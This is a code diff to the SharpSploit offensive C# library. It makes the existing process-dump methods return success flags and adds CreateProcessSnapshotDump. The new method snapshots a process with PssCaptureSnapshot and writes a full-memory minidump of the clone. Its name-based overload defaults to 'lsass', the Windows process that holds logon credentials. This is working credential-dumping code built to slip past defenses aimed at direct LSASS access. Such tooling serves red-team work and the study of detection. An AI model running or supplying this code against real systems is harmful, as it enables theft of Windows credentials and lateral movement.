@@ -197,13 +197,14 @@ namespace SharpSploit.Enumeration
         /// </summary>
         /// <param name="processId">Process ID of the process to generate a minidump for.</param>
         /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
-        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <param name="outputFileName">Filename to output the minidump to.</param>
+        /// <returns>True if minidump succeeds, false otherwise.</returns>
         /// <remarks>
         /// Authored by Justin Bui (@youslydawg).
         /// </remarks>
-        public static void CreateProcessDump(int processId, string outputPath = "", string outputFileName = "")
+        public static bool CreateProcessDump(int processId, string outputPath = "", string outputFileName = "")
         {
-            CreateProcessDump(Process.GetProcessById(processId), outputPath, outputFileName);
+            return CreateProcessDump(Process.GetProcessById(processId), outputPath, outputFileName);
         }
 
         /// <summary>
@@ -213,10 +214,11 @@ namespace SharpSploit.Enumeration
         /// <param name="processName">Name of the process to generate a minidump for.</param>
         /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
         /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <returns>True if minidump succeeds, false otherwise.</returns>
         /// <remarks>
         /// Authored by Justin Bui (@youslydawg).
         /// </remarks>
-        public static void CreateProcessDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
+        public static bool CreateProcessDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
         {
             if (processName.EndsWith(".exe"))
             {
@@ -225,8 +227,9 @@ namespace SharpSploit.Enumeration
             Process[] process_list = Process.GetProcessesByName(processName);
             if (process_list.Length > 0)
             {
-                CreateProcessDump(process_list[0], outputPath, outputFileName);
+                return CreateProcessDump(process_list[0], outputPath, outputFileName);
             }
+            return false;
         }
 
         /// <summary>
@@ -236,10 +239,11 @@ namespace SharpSploit.Enumeration
         /// <param name="process">Process to generate a minidump for.</param>
         /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
         /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <returns>True if minidump succeeds, false otherwise.</returns>
         /// <remarks>
         /// Authored by Justin Bui (@youslydawg).
         /// </remarks>
-        public static void CreateProcessDump(Process process, string outputPath = "", string outputFileName = "")
+        public static bool CreateProcessDump(Process process, string outputPath = "", string outputFileName = "")
         {
             if (outputPath == "" || outputPath == null)
             {
@@ -267,6 +271,167 @@ namespace SharpSploit.Enumeration
             {
                 File.Delete(fullPath);
             }
+            return success;
+        }
+
+        /// <summary>
+        /// Auxiliary function for MiniDrumpWriteDump callbacks.
+        /// </summary>
+        /// <param name="CallbackParam"></param>
+        /// <param name="CallbackInput"></param>
+        /// <param name="CallbackOutput"></param>
+        /// <returns>True if minidump succeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        private static bool MiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)
+        {
+            switch (CallbackInput.CallbackType)
+            {
+                case Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback:
+                    CallbackOutput.Status = 1;
+                    break;
+            }
+            return true;
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static bool CreateProcessSnapshotDump(int processId, string outputPath = "", string outputFileName = "")
+        {
+            return CreateProcessSnapshotDump(Process.GetProcessById(processId), outputPath, outputFileName);
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="processName">Name of the process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static bool CreateProcessSnapshotDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
+        {
+            if (processName.EndsWith(".exe"))
+            {
+                processName = processName.Substring(0, processName.Length - 4);
+            }
+            Process[] process_list = Process.GetProcessesByName(processName);
+            if (process_list.Length > 0)
+            {
+                return CreateProcessSnapshotDump(process_list[0], outputPath, outputFileName);
+            }
+            return false;
+        }
+
+        /// <summary>
+        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
+        /// Minimum supported Windows versions: Windows 8.1+ and Windows Server 2012+
+        /// </summary>
+        /// <param name="process">Process to generate a minidump for.</param>
+        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
+        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
+        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
+        /// <remarks>
+        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
+        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
+        /// and https://github.com/mjsabby/CopyOnWriteDump
+        /// </remarks>
+        public static bool CreateProcessSnapshotDump(Process process, string outputPath = "", string outputFileName = "")
+        {
+            if (outputPath == "" || outputPath == null)
+            {
+                outputPath = GetCurrentDirectory();
+            }
+            if (outputFileName == "" || outputFileName == null)
+            {
+                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
+            }
+            
+            string fullPath = Path.Combine(outputPath, outputFileName);
+            FileStream fileStream = new FileStream(fullPath, FileMode.Create);
+
+            IntPtr snapshotHandle;
+
+            Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS flags =
+                  Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
+                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;
+
+            snapshotHandle = IntPtr.Zero;
+
+            try
+            {
+                Int32 hr = PInvoke.Win32.Kernel32.PssCaptureSnapshot(process.Handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
+            }
+            catch (EntryPointNotFoundException e)
+            {
+                Console.Error.WriteLine(e.Message);
+                return false;
+            }
+
+            Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION();
+            CallbackInfo.CallbackRoutine = Host.MiniDumpWriteDumpCallback;
+            CallbackInfo.CallbackParam = IntPtr.Zero;
+
+            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo));
+            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false);
+
+            bool success = false;
+            try
+            {
+                success = PInvoke.Win32.Dbghelp.MiniDumpWriteDump(snapshotHandle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, pCallbackInfo);
+            }
+            catch (System.ComponentModel.Win32Exception e)
+            {
+                Console.Error.WriteLine(e.Message);
+            }
+
+            fileStream.Close();
+            if (!success)
+            {
+                File.Delete(fullPath);
+            }
+            
+            IntPtr vaCloneHandle;
+            PInvoke.Win32.Kernel32.PssQuerySnapshot(snapshotHandle, Execution.Win32.Kernel32.PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out vaCloneHandle, IntPtr.Size);
+
+            int cloneProcessId = PInvoke.Win32.Kernel32.GetProcessId(vaCloneHandle);
+
+            PInvoke.Win32.Kernel32.PssFreeSnapshot(Process.GetCurrentProcess().Handle, snapshotHandle);
+            PInvoke.Win32.Kernel32.CloseHandle(vaCloneHandle);
+            
+            Marshal.FreeHGlobal(pCallbackInfo);
+            GC.KeepAlive(CallbackInfo);
+            return success;
         }
 
         /// <summary>
